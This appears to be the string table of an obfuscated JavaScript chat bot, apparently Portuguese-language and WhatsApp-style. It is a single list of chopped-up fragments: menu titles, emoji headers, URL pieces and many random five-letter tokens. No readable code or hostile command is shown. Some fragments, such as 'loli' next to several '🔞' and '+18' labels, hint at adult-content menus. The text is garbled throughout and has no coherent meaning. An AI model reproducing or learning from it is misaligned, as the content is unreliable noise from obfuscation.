"41. ❄️", 'phxgS', 'cQyOB', 'wHqPz', "ada D", "do Ag", 'xoAJf', 'fire', " e h ", 'eIarB', 'pXljv', 'XJhZg', 'on/pu', 'lXZLo', "𝐎𝐒 🖼", "cmd 2", 'kHNBA', 'QoSsa', "\nMeu ", "ki 0", "ts er", 'WymTq', "há ch", "em gr", 'gpasx', 'S76zb', 'x.jso', 'Scgib', "ᴇ sᴇ ", 'zNPaM', "iosa ", 'LpGZj', 'sbIcW', 'UbuGC', 'pTgFH', 'lKlMD', 'Foram', "só di", 'Uvrei', 'ftXVo', 'moji:', 'oubad', ". Um ", 'DuYst', " menç", "em pa", 'seqVk', "18 1", 'youtu', 'UiRCB', "RES ]", 'BhLxU', 'vidas', 'rChif', 'Qexxt', 'FVqiL', 'corno', 'KwfwA', 'ranca', 'azist', 'GER', 'xoVrL', " Do E", 'mzTlB', 'kWZvZ', 'Sobre', 'pos.', 'JkWMG', "meu f", 'GcLnG', 'l/Con', 'delpa', "ão, t", 'windo', 'deo', 'ePOzD', 'unpnf', 'rofil', 'cszoy', 'LaimG', 'IwZXJ', 'pxlVs', 'CVAlk', 'zMieQ', " na r", "de em", 'MFGLR', "ocê m", ", o p", "do bl", "rio c", 'RkVfF', "\nTime", 'lqtKy', 'dfxHd', 'KqnJy', 'SIRSp', 'NicvT', 'ZZjAy', "🌹 *Pe", "OS ", "á ser", 'egund', "\n - L", 'qhiVT', 'VCxPX', 'gmPkp', 'GxKCv', "」 Agu", 'Pinte', 'tZfto', "será ", 'CGXMX', 'OnAiN', 'dvCCf', 'tPzsv', "ig ne", ", ou ", " mere", 'rHGyX', 'EyVAy', 'esgro', "rio, ", "ing 1", "a hoj", "ar no", "ser t", "io @", "❰ Pes", "Se de", 'yello', 'zgJAi', "Nada ", 'HIhyX', 'LNqld', 'or=wh', 'IdnIL', "𝐏 ✅", '࣪̇🔥ʀᴀʙ', 'ShbgY', 'URvTn', 'rlpIe', " no c", 'Ggvet', 'lKjuy', 'vando', 'NWQQQ', "🔥 𝐏𝐀𝐂", 'kqYDj', 'ylpBQ', 'FSctW', 'Sinto', 'PVCCb', " um d", "r pra", 'FRgLd', "--\n\n", 'izar2', 'IkdAD', 'XuGXK', "    「", 'HNOwW', "🔞\n", 'JqIGA', "e For", 'coRoE', '1f541', 'manhã', "a par", 'xhpxr', 'ofkcO', 'uário', 'wsyXd', "ᴀ:\n*A", 'aHiUt', 'FgBVX', "🤖 Vc ", 'f77dd', "ᴏʟɪ🍭 ", 'UKOGo', "dio: ", 'yEsni', 'KleQk', 'nQnAo', 'ocRVm', 'mnuME', 'ZlTtV', 'FSbzu', 'uTNhk', "👾 𝐌𝐄𝐍", 'yeXXf', 'tomát', 'arcao', "do 1:", 'oWKbf', "🇨 🇰 🇸", 'SbyCu', '_card', 'gador', 'ATBZQ', "m Dia", 'YapMx', "á pal", 'QOBTA', 'TBCys', 'b0085', 'TBFWK', 'hyahl', 'nal', 'ZEAAg', 'mKnKX', 'WWJBa', "os me", 'NBibZ', 'NpMEv', 'GGwhr', 'KOrdN', 'JjjrK', 'vanna', "m que", "ário ", 'botão', "h)':f", " só v", "ou al", "ns)\n\n", 'jZuUU', 'HfSgp', "* For", 'tivou', 'KDuPj', 'OKMBv', "i ~*b", " Amad", 'g=pt_', 'pWJhv', 'ogari', '3Dsti', "o jog", 'NLrbl', "𝐍𝐃𝐎 ✅", 's|Pix', 'nceme', "𝐑 𝐀𝐔𝐓", 'qGQGH', 'taMaq', 'dsOnT', 'arand', "e o u", 'WhurN', "sair ", '┉┉┉┉┉', '1d).', "zar t", 'qQUoA', 'kKpux', " norm", 'bPGmx', 'nOuOt', "nk\n\n_", 'qEZMN', 'EIWPF', 'pawNU', 'OhgfA', 'FkYjG', 'kKWqT', 'KeaHG', 'WPYSv', 'IZAND', 'nsmis', 'Tempo', 'wvtro', " arqu", 'RRfyo', 'd_Mag', 'FurWT', 'fMSNi', 'qtFoO', 'JhdVR', 'Gado', 'JCAmC', 'ughtE', 'tgQtp', "50. ❄️", "to.. ", "K DET", "r As ", "🇯🇵 𝗞𝗢𝗧", 'saYLj', "1. 🔞 ", "Já Es", 'de._', 'oKuEn', 'nCYUQ', " -c c", 'yyHEp', 'LOWEE', 'crimg', "❄️ 𝐄𝐒𝐃", 'jlgbm', 'EMwTG', 'kvwtZ', 'krfxb', "ero d", 'XlubL', '...*', 'mkqcR', "\n*1 -", "i no ", "NDO A", 'maita', 'fMjdU', 'ILkbv', "na ca", 'xtNcK', "de Go", " 〕 :「", "𝐀𝐏 ❄️", 'rebai', "𝐮𝐚 𝐌𝐮́", "po. E", '24047', 'otar.', 'jAlNb', 'mYwXS', 'NVEBJ', 'o&tex', "264 -", " Cami", 'nKfvt', 'GCSUI', 'TCuVB', 'WJDmJ', "a]\" -", "𝐀, 𝐒𝐄", 'yddiN', 'ttonR', 'PtynQ', 'ata/C', 'MMYyq', 'WCUEz', "𝐄𝐒𝟓 ❄️", 'dCmos', "to: \n", "sso c", '*Some', 'WxgTy', 'nweat', 'cemit', "𝐕𝐀𝐑 𝐀", " né..", 'promo', "u cri", "bot q", '༻═┉✼┉', 'sESfi', "mo es", 'umZmA', 'push', ':-5:-', 'tXcmw', 'phPvw', "12. ❄️", 'bOLQm', 'isso,', 'lyVnD', 'CJpyP', 'simih', "Foi A", 'eATdR', " Grup", "ais 🙈", 'HgZKM', 'VvBLh', "do me", 'sponí', 'YTwUN', 'tor', "el II", 'EqmYT', 'o.jso', '0_15_', " *USU", 'DHmbZ', 'metod', 'LaLKY', 'ycWTl', "ero: ", 'JAwZR', "e sim", 'IYvvc', 'yVjpo', "ESSE ", 'at.wh', 'giTyX', 'loKSW', 'GqNQO', 'njabw', 'te-no', 'oawlK', 'JPkvz', 'xOLzL', 'IzpIV', "o úni", 'GDZNV', "e o g", 'DHMUR', 'MWFIp', 'nkIZg', 'UOBmm', 'IMFUn', 'a042a', "𝑰𝑶 3 ", 'kvMVP', 'DHWTH', 'YFtIe', "𝐍𝐓𝐈 𝐀", "o voc", '3|2|0', "u ao ", 'DKJWB', 'OXXNq', 'cd52c', 'mbuSq', 'i-pro', "𝑰𝑶 📀\n", "ito c", "xo..\n", "foi a", "u o j", 'ferio', 'rVJyd', "* : [", 'locke', 'sPqdV', 'maNhZ', 'NJSUL', 'urXqG', 'NFPpx', 'CHTzL', '2_1_M', 'vrSpF', "to. U", 'HnSef', 'ando,', 'vWVKj', 'ATIVO', "\nDerr", 'SvvBj', "᜔࠭ ⁸₈", 'ZPIpx', " _- @", 'eHBtH', 'ttonI', 'IzZmy', 'ntado', 'QqERb', "em ou", 'kGtgh', 'ogle.', "*\n*1 ", 's/Me1', 'NBMdV', 'gPlOR', 'WgPlw', '|3|4', 'NoYcr', 'dade.', 'FOoUT', 'veZJN', 'WAPLj', 'YisdJ', 'FzTZL', 'LeLGb', "Olá @", 'pyXHy', '*Avis', 'eHwIW', "0p -v", " tent", "Foi a", "RIYA ", 'JXqXM', 'esso.', "no fo", '4.54.', "VRA P", 'UaUTC', 'gYSbv', 'OiPxp', " HUNT", 'PZTns', 'psPPX', 'eYPlA', "< Eit", 'ALIZA', 'ywecT', 'devic', 'IbqZn', 'ruKml', "old p", 'pNXGl', 'GMSTk', "á blo", 'wYNkS', 'lXXZH', "que n", 'SrANw', 'nata2', 'BbXia', 'AvQOm', " minh", 'findI', 'LtdUX', 'uMPci', 'dácia', "ado, ", "𝐍𝐈𝐂𝐀 ", " 💨\n  ", 'umero', 'JUjDl', " MAIS", 'Qualq', " com ", "veja ", "8. 💜 ", 'ngnvK', 'gZBrQ', 'inida', 'XcfuM', 'infod', '𝐈𝐙𝐀𝐈𝟐', '19%25', "á a p", 'lhob', 'mUYIz', 'agvQZ', 'jkjaD', 'un%25', " grup", 'RWMbO', "i pos", 'JmvjI', 'HmreD', ", e p", 'ome/i', "」\n🗒 *", 'BDSBJ', 'XSuFh', "ar* :", "🍃 @", " o mo", 'AfTTg', 'oNGJG', ", que", "ema D", 'Oypso', 'oemWD', 'api.t', "\nUse ", 'Indef', 'KFXnF', '10oUfqnh', 'vPuoi', 'QoCiE', 'eNFnx', 'KPBMa', 'aleLo', 'Vhcmu', 'o/usu', "gp  ✔️", 'vgusW', 'tenha', 'tado:', "*[ ❗ ", 'nrmGq', 'BhVYl', "ADM, ", '.iblg', 'gviEt', 'TsKTY', 'YKbJt', 'SimTP', 'KRESd', 'JRYXL', 'erSeU', 'iIDHG', 'DQhMU', 'FigPa', '𖧹•─┅╯', 'rking', 'yKpUE', "\n*Opç", 'PRzGx', 'GdcgW', "% [🦬]", 'cido', 'LaBMc', 'AJxEv', 'DBIYo', 'uSnsz', 'OStSZ', "er na", 'fcKFR', "cê se", 'XUjOq', 'EWi1s', 'mChmg', " |   ", 'izado', '84701', "e aus", " os g", 'bzcgD', "ubo c", 'PDWKF', "e Gad", "co 🥴", "so es", 'XFgOL', '.png', " a vo", 'qkGap', 'SmNbG', "da So", 'kpCbD', 'snJLO', "[ MEM", 'rEXVf', 'VEmuX', 'ilePi', 'eKnKM', 'hMTse', "s do ", 'foiZX', 'ytVPY', 'DsbJp', 'csZVU', 'bBDxw', 'obSon', "ig mm", 'YMEMx', "\n Núm", "r vis", 'STRO:', 'wymiz', '❄️𝒑𝒆𝒔𝒒', 'TPdtO', 'IGwkU', "ɪᴄᴀ✂️\n", 'RUPO*', 'WVqaA', " 」Voc", " 🎉*\n\n", 'dMess', 'wWjEg', 'xLXNm', 'min', 'kdfdL', 'po.', "o: ti", "Crie ", 'anido', "r meu", 'ocBEO', "a exe", 'OOlhm', 'INJpC', 'poOrC', 'PTAmn', "r Fig", 'FmGGf', "o lig", "OS PA", 'akHsZ', 'rGRqq', 'DMWYG', "nimo ", "le\n\n©", "Tá lo", 'UFHbw', 'XdnBQ', "❄️ 𝐌𝐄𝐋", 'YRnKm', "ki 2", 'tuFYk', 'NYbnn', 'fTsBe', 'VwsIt', 'hp79m', "🎧 𝑨𝑼𝑫", 'dvExB', 'axYBi', 'pi/dl', " veze", 'xXOVC', "𝐚𝐧𝐝𝐨 ", 'tzNiF', "\n★ Ro", 'bxhQx', "toda ", 'OXymW', 'rmpal', 'aSqYo', "tá de", 'fantá', 'TWhxH', 'cKgVA', 'aJaDs', 'a/%20', 'WwbgD', 'setfo', '𝐎𝐏𝐂̧𝐎̃𝐄', 'sPvwU', 'txt', 'htolv', 'rJTYm', '0bc8d', 'QfgvQ', 'JyZvw', "e per", " BOT ", '*💂‍♂RAN', 'esto.', 'ng=pt', "🐻\nㅤㅤㅤ", 'XbZJr', 'IKVcr', 'LQMwf', 'a%26u', 'LastR', 'attp3', 'vidro', 'menul', 'root@', " Alea", "é 🙁, ", "da de", 'cGYoy', "o 🔞\n", 'umhFE', 'cVHGb', "𝗜𝗥𝗜 🇯🇵", " 🌹\n", '.cont', 'BcJzg', 'aeOoR', 'tição', 'kMesb', "MOD C", 'ZKyAr', 'emp_A', 'cLHRk', 'VsrGH', 'acqui', 'uwDGo', ". Mel", 'jRNBf', 'UkvTb', 'GIPFO', 'zpSMd', 'wRSDx', 'QQJjA', 'GvLqz', 'echar', 'jEEXj', "cia S", 'NaDCy', "ds. V", '|4|0|', ": *R$", 's/Isa', "0 (Ma", 'HvdHE', 'UOQPE', 'IOWei', 'f0b6c', 'DJOFm', 'essoa', 'uexXC', 'gVwbc', 'RcjEE', 'getCo', "nça, ", 'kxJLy', "\n\n@", 'rvaçã', 'main', 'zFefh', 'ário)', 'ntSbJ', "king ", "s!\n\nH", 'PCaXQ', '𝐀𝐃𝐎𝐑𝐄', 'SzrRk', 'pleto', 'IyNSR', "STE ", 'QfXDe', 'FWZMd', "[ Sug", 'QCJWT', "ora c", 'zigFq', 'MGIoI', "1: O ", 'PvgJZ', 'SkrlP', 'clima', "á per", 'nTfeL', 'tosLJ', 'stPar', 'DXONy', " dize", 'KyanQ', 'JEbaZ', 'hfQMP', 'TfjrY', '𝐂𝐀𝐂̧𝐎̃𝐄', '00000', 'lIYru', "e pal", "a\ndes", 'cRPes', 'obran', "bro i", 'PrTJo', 'BPaGT', 'wYJfI', "do, j", "s min", 'nAQFw', 'FFPaH', 'fVTPv', 'Ebxhz', 'e3PmO', "ia de", "\nTota", 'ymGzw', 'lo..', 'UzMje', 'jqdSh', '.js', 'VQYDu', 'LUcrE', " 𝐋𝐄𝐕𝐄", "po* :", 'RFfju', " 🔥🎉", 'wMlVZ', "u tir", 'ApBNQ', 'OBjvk', 'WobCw', 'Máxim', 'arcmd', 'MxwZk', 'PZpJQ', "🇯🇵 𝗦𝗛𝗢", 'Wnlmy', 'bEUek', 'OuRFu', 'vTJIy', "iso a", 'açanh', 'RmGCD', 'vhOev', "tos (", 'opehu', "🇯🇵 𝗠𝗜𝗡", 'fMAzF', 'mDHhx', 'pPJAn', "céu :", "elo n", 'CoNMx', 'LNtbZ', 'cYmqy', 'HZiuv', 'CqLFl', " ONLI", 'yPtQi', 'FVyWa', 'LPFMa', 'dtRlx', 'válid', 'lizou', '𝐏𝐄𝐒𝐐𝐔', "s V 🔞", 'rxbst', 'vEdgb', 'uvXUO', 'cxteK', 'et4/Y', 'IGrZP', " Só r", "um ou", "ioso ", '37m', "inar ", 'MvReO', 'iIJQG', 'WRgRX', 'CERRp', "uas c", "ot, s", 'doado', 'kyHfh', 'Cdunf', 'Drivi', 'LHEyU', 'QgPIV', 'quali', 'VJeYH', 'guel', "/5\n║\n", 'DmeEK', "da. E", "ng de", " PROC", '𝐈𝐂𝐇𝐀𝐍', 'eVsZy', '137', 'lrMJj', 'Zschp', "oa Ta", 'rYRjt', '/meut', 'uOjBM', 'lbttR', 'auzqj', 'oDgZV', 'BEsSK', '700', 'bIKga', 'hive', "que d", 'ída*', 'nvWKd', "ck da", 'wClbE', "to OT", 'MgKxT', 'zuko2', 'ORY-B', "thor ", "😈 *Ex", '--lea', '303', '🚫@', 'UWt3N', 'OBXgD', "❄️ 𝐉𝐀𝐏", "iona ", 'INTpr', 'rince', 'nol', " sufa", 'HYnah', 'HZUjx', 'LOECw', "ei o ", ", alg", 'jcqgP', 'daAAm', 'mWgNb', 'AOBAH', 'mpgtY', 'loli', 'XSeTV', 'bjJHZ', '🌳🌲', "🔞 𝐂𝐀𝐌", '╍━━⊰❆̸', 'angho', 'gaXiN', 'jKrDi', 'OPBtV', 'aufjK', 'ovado', " o us", 'dILyX', 'WXMQh', '.1.fo', 'bsqtb', 'YvYBJ', 'HVCMl', 'aeXhY', "cê ac", 'JDwVi', 'WmDAD', "io só", 's/ISA', 'ZYddn', 'pMfZF', " o *l", "\n\n🕹️ G", 'YdoaK', 'TOrAW', 'gPwTo', 'UmgCc', 'uyqPR', 'ftFus', 'nnQyW', "🤖 um ", 'KPFIn', 'jfazv', 'wLrut', 'SkAwm', 'oRygT', 'culpe', 'kqzpQ', "ra pr", '*Grup', 'TcaoI', 'ido', "ocê s", 'EzrvD', 'miMRw', 'BtimE', 'Sysin', 'gif/o', 'exmYN', 'ovame', "S2 ❄️\n", '4|3', 'UbtJD', " |\n+-", 'sMhpq', 'RRdvZ', "a ama", 'idMen', 'LCLLl', "5%.\n\n", 'vQAXq', "i Pal", 'minis', 'natsu', 'ndo.', 'LAhqT', " tapa", 'per', 'unshi', 'EWGBg', "ROS M", 'gMGgu', '▀▀▀▀▀', 'BbFXq', 'xPXMG', 'eaYbc', 'VSkjc', 'Mw9G/', 'dZngX', 'qOGgI', 'BPxYG', '0|4|2', 'PPohk', 'uOhuk', 'kEjyc', 'succe', 'uDZZG', 'jhMlV', 'BogKO', "o seg", 'CbYXE', 'ataVe', 'Preci', "na Mu", 'Vwuyr', "uem, ", 'FLfwn', 'm-04c', 'YcEdS', 'ssion', "v fps", 'ranke', 'OyDin', 'WDUAA', "ero i", 'packm', " na p", 'npiOF', "i Víd", "ode p", 'envms', 'zSgyk', 'iJayj', "o víd", 'IKSTi', 'aritm', "ras, ", 'in/wa', 'bgpnZ', 'wCyqz', "alor ", "e. 😍", 'tores', 'iSjGi', 'Iqxtt', 'FXnmc', 'KvwOc', " : [ ", 'OiRvV', 'CjNAJ', 'advli', 'retân', 'OwfZe', 'mfvxm', 'DlURE', " gara", "y Aki", 'plays', "↝ Ano", 'Feio,', 'YJpWC', 'Hhlcr', "utro ", 'uri', 'lciRK', 'TxDSN', "2 ln(", 'nYcFq', 'wTIId', 'Ktdfp', 'yUngx', '=63', "No ca", 'scote', 'SsOZq', 'IiBau', ". Exe", 'bject', "𝐈𝐇 ❌", "gar e", 'Gfquo', '.y=-2', 'MOD-t', "𝐄𝐒𝟐 ❄️", 'YCBGG', 'JnjQk', 'modo+', 'GmuoT', 'vFzmx', 'Myyft', "que f", 'yRPEg', 'dDEbE', 'WgyJI', '0|3|1', 'tly/C', 'xXqeP', " do *", "S5 ❄️\n", " áudi", " ❳╼╾╯", "𝐋𝐋𝐄 ❄️", "\n - I", '02297', 'jiEFf', '8578a', "𝐄 𝐏𝐎𝐑", "i tir", 'NhNeF', 'apike', 'MlHkj', "de le", "er é ", 'QxEJR', 'tZEi0', 'nda', "dida ", "🇯🇵 𝗘𝗕𝗔", "ue co", "gar o", 'TPGCk', 'NtjzY', 'fUaHb', "se re", 'gVoBi', 'tps:/', 'NJCCw', 'vJamn', 'c5aXM', "iado ", 'aSAoO', 'ijtbm', 'aRBjZ', "ar ", 'doFQn', 'kAVos', "ão.\n\n", "1. 🔳 ", 'NnAgS', 'álido', "stá b", 'xSyzS', 'pBFad', 'SYFTC', "𝐍𝐓𝐈 𝐅", 'édita', 'udio.', 'rCbBs', "0 -s ", " SAIT", "imas ", 'qTMWp', 'IwnbP', 'spond', "ja ti", 'Bybel', 'bLjKg', 'ICyBy', " Arca", 'gram.', 'wwDMS', " 1 mi", 'jJQCO', 'hitle', 'hLVlq', "\n© by", 'envia', 'upymj', "r tod", 'jIwZc', '2|0|1', 'onhnh', 'IVSFg', 'GjaWB', 'mIdmg', 'do..', 'enção', 'PESxN', 'f=20:', "rdao ", 'e..', "o a t", 'yNEYi', "O DO ", 'le/4t', "te ad", '9|8|1', 'MjrAw', 'sLIed', 'JKYdH', 'pRQdY', "a lon", "ione ", "r?\n\n", "DMs:\n", 'Pront', 'rXzDY', 'JAOvW', 'var4', "* *at", 'PRrxo', 'kbJvD', "o Spo", 'subtr', 'hTolM', 'SaiXY', 'mpCNm', "has c", 'Ohkmk', '=100&', 'rwSVH', 'rLzuT', "ou. I", 'dklez', 'fRAvM', 'QHRxF', 'OHmRW', 'dolar', 'entre', '_NONE', 'BqsyD', 'MasWL', "fio e", "🔞 𝐀𝐋𝐘", 'ovpNw', 'pYnfM', 'fkaAz', "ê com", 'wbJyM', 'geiro', 'XDVqm', 'TSxwC', 'LnlJB', 'ijpKS', 'tGeGU', "19. ❄️", 'KngIu', 'elete', 'istem', 'jMfLj', "🌟 Cas", 'aBKVI', "»°】\n𒋨", 'nder', 'NYkgT', 'iorme', 'icon', "le, m", 'EnjsV', 'r&the', 'jsuGL', 'xODlu', "s é f", "ig zo", 'MfFtW', 'diqIK', 'qhIOH', 'DHFFq', 'bneYv', 'RSRLM', "O Bol", 'MEXII', 'idor.', "ata d", 'opula', " Visu", 'EogMz', "ra ex", 'essar', 'YyZFV', '𝐄𝐙🔥', 'uKiOm', 'GTofN', 'kLkPl', 'cAQfs', 'vtuCg', 'DcYld', 'filet', 'ORHIh', 'unGnW', 'tdQxl', 'jNzEW', 'iUwCC', "s ]\nD", 'cELMD', "zip -", 'ossle', "tá ", 'OTutV', "ig ot", 'lQcdX', 'DvaoN', " Conf", 'jtCEn', 'enino', 'loAIh', 'ouro', 'essár', 'ith', 'BKHmX', 'iator', 'AkcPx', 'peito', "am Cr", 'lente', "pra v", 'Lmovj', 'Iohex', "ARA M", "ar um", 'C3%A3', "ar?\n\n", "r, a ", 'core', "EP qu", "... 😟", 'VHpIf', 'fWVtE', 'WCJqm', 'peRqO', 'bHHpp', 'tBGwA', 'MDPTS', 'Menci', " Drag", "0 par", 'Total', 'roAyB', 'neoty', 'SbmfK', " Cara", "\nD ", 'EkKtD', 'nekTT', "ão te", 'zBiei', 'Bgiaz', 'JhrJa', 'RFiPe', 'EeAjt', 'HlCTj', 'DfPlb', 'PtNHg', 'gxjDy', 'kQAtq', 'FJxXM', 'WuqJK', 'iumMV', 'orm', 'pEExf', 'ckgkU', "𝐈 𝐕𝐈𝐒", " de U", 'IMlMB', "a Rev", 'AxfNw', 'UVyZA', 't/pin', 'ninin', "- ⏰ H", 'ido/R', 'Vaxjq', 'rtudo', 'ZreDC', 'EGFZv', 'zrnUi', 'LuRtj', 'GDwdG', 'zpIGQ', 'qrsqI', ",* ag", 'de?', 'LJXwY', 'EPltT', " veri", 'TICAL', 'WWSUY', "Qual ", "e o d", '/zipb', 'so/%2', '15947', 'rtBll', 'jFhcs', 'qZTFa', "ra:* ", 'girlm', 'está', "ido p", "a fic", 'HnGUA', '.283M', 'RkOCU', 'MhcWs', 'pate', 'WCATm', 'sjCIu', 'no2.', 'sKWPU', 'mvJnu', 'OPwAD', 'respa', 'TALOG', "sa, m", 'oFTmP', 'flags', "de at", "e, e ", 'DGJAo', 'exten', 'PuWAr', 'rVpqx', 'GPuYq', 'nt.fa', 'tadio', "te fe", 'RObBC', 'GAxKW', "ig jj", " recu", 'mrrjZ', 'CARAI', 'DGetM', 'lWLCj', "plo: ", "m bei", 'aria', "ETOS ", 'LYuGy', 'jmTqJ', 'xt=', 'yWQAl', 'ebZNq', 'tCDHq', 'BgSqu', "o, le", "a num", "sica\n", 'exit', 'NMQYc', 'xar', 'upo*', 'delau', 'bemlA', 'XVTzJ', 'zVwxo', '18.jp', "ves P", '4|0|2', 'bvGrV', 'MihoH', 'JCFDy', 'SNvrD', 'mage/', 'Siihp', " 𝐀𝐋𝐘𝐂", 'nscri', 'MTTZZ', 'zgHep', "\n│𝐍𝐚̃𝐨", 'simi.', 'compo', 'nLRiV', "de tr", "Case ", " baix", "oso? ", 'ddaRr', 'el.', 'gWrqc', 'UXpau', 'geiaJ', 'JJiek', 'mtPVu', 'preto', " (UUI", 'ossív', '7uo/D', 'VesIU', 'rSwlU', 'OEZSD', 'kUedk', "o nov", 'iDeVU', "50 Go", 'OHYxa', 'jnqcj', 'citie', 'uR7k6', "d, o ", 'mIDqS', 'Mnyxc', 'RCycg', "var:\n", '/webp', "rama ", 'tch', "s dad", 'ZCvjg', 'ClWhC', 'hBgwY', "ta Ma", 'nesse', 'MBHRb', "s fig", "io pr", 'CfWCk', 'fgteG', "dos s", 'jogo5', '𝐇𝐈𝐑𝐀𝐘', 'cXdag', 'uUYnH', "do de", 'assim', "ium.\n", 'hWZFl', 'pxKtR', "  *le", 'dSNMZ', 'gator', "e ped", 'riMaO', 'ciona', 'bBfOn', 'cSuOh', 'botes', 'NxxCs', 'sfwZT', 'fPMZU', 'oJQWy', 'LAaJd', 'JrbXV', 'WZhgP', 'xXinX', "k, só", 'kmnkC', "té qu", 'IZADO', "mal, ", 'WsVlv', 'om/%2', 'IwSIM', 'Manso', "cada ", 'bMlPc', 'McHxT', 'rmHnR', 'KfewR', 'pYsuY', 'UQ3Mj', '/main', 'outro', '*NOME', "ceba ", 'ubado', 'MDSXO', 'cGGtO', 'e117c', 'DfruJ', 'utAjA', "NE MO", 'izada', 'nBxTr', 'var7', 'DZqrH', 'VngHs', 'func', 'PVSBz', 'AZguP', 'jxafV', 'HScqd', 'rodel', "ig sh", 'iUEuk', '-----', "ço pa", 'cDwob', "re h4", 'YoVeD', 'pOTqG', 'DGnaE', 'Veloc', " Acco", 'dIxGh', 'aJgOr', 'GRUPO', 'cZunk', 'gmail', 'Miyec', "oram ", 'c69e7', '*----', 'vWFsF', 'Aspir', 'UoVHh', 'iOLMW', 'WcWfE', 'hdseo', 'H1KZ2', 'HDEmw', 'ntica', 'EbOeN', 'ption', '!calc', 'KZzoN', 'arcom', 'hegao', "o, ut", 'LppJl', 'xEOiS', 'SNcqk', 'uLKvF', "em, e", 'trAJH', 'jTYPv', 'ZsbMN', 'oloqu', 'VMIOz', 'escob', 'EaDJi', " dimi", 'alhad', 'WTDNH', 'khkhG', 'TpZQV', 'gEorr', 'wpTAM', " lege", 'toda', "='min", 'oUCCc', 'GxLfs', 'NGrDq', "e rec", "\n• *G", 'AVADT', "iar c", '%20Da', 'puGoy', 'mWWYo', "5 PAU", " Se d", 'yulUr', 'sOwpB', 'ibslh', 'ErNWW', 'ste.', 'xBxDW', 'esde:', 'nclus', 'prést', 'RmeTi', '#Dono', " fale", 'IjMIb', '20Ser', 'nRKjz', 'grams', 'reEDR', 'FVTjN', 'ehAdy', "de pa", 'ekBCG', 'PBycR', 'fdVuN', "O Nom", 'bagTw', 'CrHuq', 'WXpHg', "a dos", 'PmCOr', 'das', 'WwdWM', "lo a ", 'hYFtp', 'sabil', 'eOSOD', 'YIsXw', 'WgpDF', 'TuesK', 'dele.', 'PEkRq', "adm p", 'XSUKE', 'JhPom', 'YWvoj', 'ouUYU', 'jHGrC', 'OUHlo', 's_for', 'KoGPy', '1|0|6', 'zVtKH', 'Putz,', " saiu", 'attp', "m due", 'FE.jp', 'OigGC', 'oIjfq', 'te..', 'RpIhN', 'FQUZq', "\n----", 'kjFLD', " PV2:", "rupo\n", " sign", "r↓   ", '-lock', '/2.5/', 'IqjZg', 'bJuQC', 'XChsv', "r, de", 'DSbce', 'fmhIA', 'otivo', "te qu", 'yMato', 'tId', 'aKSLW', 'hasan', "XT (2", "s mer", " MENU", "eio 🙉", 'jYGLD', 'YIwgw', "rar q", " tá f", 'eiram', 'aTrfr', 'GIUGv', 'tpts=', 'otus|', "rdeu ", 'tify.', " 𝗣𝗜𝗘𝗖", 'SlTtP', "por u", 'toISO', "om a ", 'difer', 'DFGWZ', "\n   ❄️", 'mwHby', 'cgFDV', 'sArra', 'uMVqC', "ar me", "o 0", 'eolPt', 'nleyq', " deve", 'NkfId', "M dis", 'mgAbJ', "ig ba", 'rizKB', 'htUG5', 'XIgpp', 'WdFMx', "r, vo", "em no", 'GgOsN', 'gJpVs', 'HjXVU', 'IiKUh', 'duuKt', " de p", "a ser", 'DBEQi', "ai no", 'mlvlz', 'showA', "ize o", 'ShXOI', "46. ❄️", " se p", 'ings', 'adows', 'wqOYX', "\n___-", 'MoFFc', 'agqxm', 'BlLlX', 'wGrYR', 'iRwWp', 'dHfiv', 'ile/4', 'dTrAq', 'McLyR', 'bIKWb', 'appli', " 2 re", 'dCgWj', "\n\n*Re", 'g_aut', "de re", "or ut", 'ueira', '𝐃𝐄𝐎𝐒🔥', "ime, ", "á pre", 'YpZTz', 'aduzi', "❄️ 𝐙𝐎𝐑", "erá b", 'mídia', 'AiLvc', "- 📽 𝑽", 'OgESz', "O con", 'CaqnK', " doar", 'GYker', 'QFFjo', " 1, D", 'in.co', "a dow", "ESTÁ ", 'HWPgW', 'uanto', 'jHAWT', 'bNfDX', 'hGeUa', 'cczRe', 'SVcQE', 'xmjrn', "𝐈 𝐌𝐀𝐑", 'CBTRV', " (ex:", "\nBem ", 'meira', "ipv f", "sa ro", 'Mryhk', " sequ", " Pac-", 'exp(1', 'domYn', 'dNmtT', 'imada', 'xo-bo', " 𝐃𝐄 𝐏", "s \n", 'EnfVS', 'SEPzn', "Pix n", 'iSgcY', " SORT", "a 1", "*\n\n--", 'statu', 'anhad', 'FBHYC', 'hlnzx', 'LZjFU', 'iFXpH', "m meu", 'FnVHX', 'ycyif', 'EWgOG', " pega", 'olhi,', " é o ", 'JSZVl', 'physi', " OFC ", 'NayvT', " da v", "ssoa ", 'CpOZJ', 'dxUWh', 'sNbFc', 'qmSPM', 'reate', 'znycF', 'Wyxup', 'ZuJfY', 'XCJuO', 'noFot', 'tEbRW', 'stare', 'ajTnF', " no p", 'ain', 'ChatM', 'xRLqE', 'ooden', "ho pe", "ig on", 'cogpY', "xual ", "ê não", 'IRsMs', 'jMRPy', 'kWwvS', 'sed', 'brpqo', 'LExIa', 'pKrBa', "etar ", "em vá", 'jUMzN', 'oxing', " cert", 'ime', 'chatg', 'Hczem', "hoje ", "as pr", 'bYaxE', 'IpOAI', 'Eyjsa', "o Tim", "ar Co", 'kCuAi', "céu é", "dec l", "𝐓𝐀 𝐃𝐄", "do e ", "11. 🔞", 'AFReK', 'jDCoH', 'prefi', ", e n", "é fof", 'ornos', 'AGpOI', 'TcjhR', "7) Ap", 'bLaXt', 'tevmy', "m pra", "ê vai", "om o ", "ados ", 'TAxjv', "ta pr", 'RVDBb', 'SZHPg', 'FQJRT', 'NLjqU', "H-QR ", 'OJmhG', 'iGEKf', "dm ne", 'mDzCJ', 'rupo,', "ANHÃ ", 'toFor', 'gCneU', 'TBmXB', "to au", 'ncy_c', " anag", "ntre ", '𝐀𝐓𝐈𝐕𝐎', '𝐃𝐄𝐈𝐑𝐀', "oi um", "\n┊   ", 'horar', 'GsDxz', 'figro', 'PzLMf', "us ", 'NRiXM', 'OGTUb', "de ap", 'colun', '#main', 'rlGwq', 'aUPWD', '━┄━┄━', 'FCCRu', 'AhIbm', 'LTbIx', "m com", '2c498', 'KGPpn', 'https', 'fwpSE', 'MfOay', 'astur', "tor, ", 'TQorh', 'FavJr', " dias", "\n║ 🧠 ", 'en=re', 'xnNwh', 'CwJcm', " 𝐂𝐀𝐑𝐀", " ★\n\n+", 'uQPLw', 'eXgUc', "\n\n\n\n\n", 'ijpIa', "da pr", "o, te", 'mvKEz', 'XxfWc', 'ILIZA', "AIS O", "digo ", 'mDtVU', 'eUfpd', "a mp3", "+18 n", "e ➪ ", 'ALAVR', 'IhwFc', 'sHTog', "t não", ".\nExe", 'QVMal', "de pe", 'qQrnd', 'scVwt', 'tativ', 'XdznX', 'yKr-2', 